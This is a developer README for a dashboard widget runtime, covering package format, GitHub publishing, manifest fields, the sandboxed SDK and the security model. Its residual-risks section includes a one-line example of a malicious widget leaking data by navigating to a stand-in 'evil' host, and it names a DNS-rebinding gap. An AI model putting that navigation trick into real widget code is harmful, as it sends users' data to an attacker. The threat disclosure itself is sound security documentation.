# Widget runtime

## Package format

A widget package is a folder with two files: `manifest.json` and `index.html`. The same format
is used everywhere:

| source | where it comes from | who may change it |
|---|---|---|
| `builtin` | `widgets/<id>/` in this repo, seeded on startup | only by editing the repo |
| `ai` | written by the assistant (`save_widget_type` tool) | the assistant |
| `installed` | a GitHub repo/folder, pinned to a commit and recorded in `origin` | only by updating from GitHub |

Each type has a `revision` that increases on every change; open instances reload automatically.
Permissions are always granted per instance by the user (the picker's Add, or the Allow bar),
whoever wrote the widget, and a new version can never silently widen access.

## Publishing a widget

1. Build it: write `manifest.json` + `index.html` by hand, or ask the assistant to make one.
2. Export it: **+ Add widget → Library → Download .zip** gives you `<id>/manifest.json`,
   `<id>/index.html` and a `README.md`. Fill in `author` and bump `version` in the manifest.
3. Publish it: push the folder to a GitHub repository. One widget per repo (files at the root)
   or a collection (one folder per widget, up to 3 levels deep) both work.
4. Share the link. Others install it with **+ Add widget → Install from GitHub**, using any of:
   - `https://github.com/you/repo` (default branch; shows every widget in the repo)
   - `https://github.com/you/repo/tree/v1.0/weather-pro` (a tag or branch, one folder)
   - `https://github.com/you/repo/blob/main/weather-pro/manifest.json`

How installing works:

- **Preview, then install the same commit.** The preview resolves the branch/tag to a commit SHA
  and shows name, author, version, permissions, size and a source link. Install fetches exactly
  that commit, so what the user reviewed is what runs.
- **Updates.** "Check for updates" compares each installed widget's commit with the latest commit
  of the branch/tag it was installed from. Updating keeps the widget id and every placed instance;
  any newly requested hosts or secrets show an Allow bar instead of being granted silently.
- **Ids.** The manifest `id` (or folder name) is used; if taken, it is prefixed with the GitHub
  owner (e.g. `acme-weather`). Reinstalling from the same repo/folder updates the same id.
- **Private repos** need a `GITHUB_TOKEN` secret; the server sends it only to GitHub's API and raw
  file hosts, never to widgets.
- Limits: `index.html` up to 200 KB, `manifest.json` up to 64 KB, 50 packages per preview. Branch
  names containing `/` aren't supported in URLs; use a tag or another branch.

## manifest.json

```json
{
  "id": "weather",
  "name": "Weather",
  "description": "Shown in the picker",
  "version": "1.2.0",
  "author": "Your Name",
  "homepage": "https://github.com/you/hosted-widgets",
  "license": "MIT",
  "size": { "w": 3, "h": 3 },
  "permissions": { "hosts": ["api.open-meteo.com", "*.example.com", "192.168.1.5:8080"], "secrets": ["API_KEY"] },
  "props": { "city": { "type": "string|number|boolean|select", "label": "City", "default": "Berlin", "options": [] } }
}
```

`permissions.capabilities` asks for server-provided abilities: `system` (read CPU, memory, disk,
temperature and host info) and `ping` (check whether URLs respond; status and latency only). Like
hosts and secrets, the user approves them per widget.

Prop types: `string`, `text` (multi-line), `number`, `boolean`, `select` (with `options`).

Host patterns without a port allow only 80/443. `*.x.com` matches subdomains, not `x.com`.

## index.html

An HTML fragment placed in `<body>`. The SDK is available as `window.hosted`:

| API | |
|---|---|
| `await hosted.ready` | resolves (to `hosted`) once props/theme arrive |
| `hosted.props` / `hosted.onProps(fn)` | instance settings (manifest defaults merged) |
| `await hosted.fetch(url, {method, headers, body})` | proxied request → `{ok, status, headers, text(), json(), dataUrl()}` |
| `"{{secret.NAME}}"` | placeholder in url/headers/body, filled in server-side |
| `hosted.hasSecret(name)` | whether a granted secret is set (value never exposed) |
| `hosted.storage.get/set/remove(key)` | per-instance JSON KV (64 KB/value, 100 keys) |
| `hosted.setProps(partial)` | persist settings from inside the widget |
| `hosted.openUrl(url)` | open an http(s) link in a new tab; only honoured during a real user click |
| `await hosted.system()` | host stats: cpu, memory, disks, io, temps, info (needs capability `system`) |
| `await hosted.ping(urls)` | `[{url, ok, status, ms}]`, reachability only (needs capability `ping`) |
| `hosted.sparkline(values, opts)` | inline SVG sparkline string (`width`, `height`, `color`, `min`, `max`, `fill`) |
| `hosted.formatBytes(n)` | `1536` → `"1.5 KB"` |

Style widgets only with theme tokens (see `themes/README.md`), e.g. `var(--text)`, `var(--surface)`,
`var(--accent)`, `var(--font-display)`; they are set on `:root` and update live when the user
switches themes. `.muted`, `.error` and `.label` classes are predefined. Uncaught errors are shown on the widget.

## Security model

- Frame: `sandbox="allow-scripts"` (opaque origin: no cookies, storage, or parent DOM) and a
  CSP of `default-src 'none'; connect-src 'none'; img-src data: blob:` ... so the widget has no
  direct network access. Images from the network must come through `hosted.fetch` + `dataUrl()`.
- The dashboard identifies callers by `event.source` window, so a widget can't act as another.
- Grants are snapshotted from the manifest when the user adds the instance; the proxy enforces
  `grants ∩ current manifest`, so a redefined widget can never silently gain hosts or secrets.
  `PUT /api/widgets/{id}` cannot change grants or the widget type.
- Proxy: http(s) only, no URL credentials, redirects re-checked per hop (headers dropped
  cross-host), 2 MB / 10 s limits, secret values redacted from responses. A public hostname
  may not resolve to loopback/private/link-local addresses (DNS-rebinding guard); LAN names
  (`.lan`, `.local`, `.home.arpa`, bare names) and IP literals may resolve privately; loopback
  must be granted literally (`localhost`, `127.0.0.1`).

### Known residual risks

- **Self-navigation**: no sandbox flag or CSP directive stops a frame from navigating itself, so
  a malicious widget can leak data it was *legitimately given* (props, granted-host responses,
  its storage) once via `location = "https://evil/?…"`. The dashboard detects the second frame
  load, blanks the frame and flags it — but the request has already been sent. Secrets never
  enter the frame, so they can't leak this way.
- DNS check-then-connect is not pinned (TOCTOU) — a fast-flipping rebind could slip through.
- The dashboard itself has no authentication yet; anyone who can reach it can use the API,
  including the AI chat (which spends the configured provider key).

## AI assistant

The assistant (`app/ai.py`, tools in `app/ai_tools.py`, prompt in `app/prompt.md`) can create
`ai` widget types, add/arrange/remove widgets and set the theme. It cannot grant permissions:
widgets it adds start with no access and show an Allow bar. Provider keys are stored server-side
in `settings` (not in `secrets`, so no widget can ever be granted them) and are never returned
by the API.
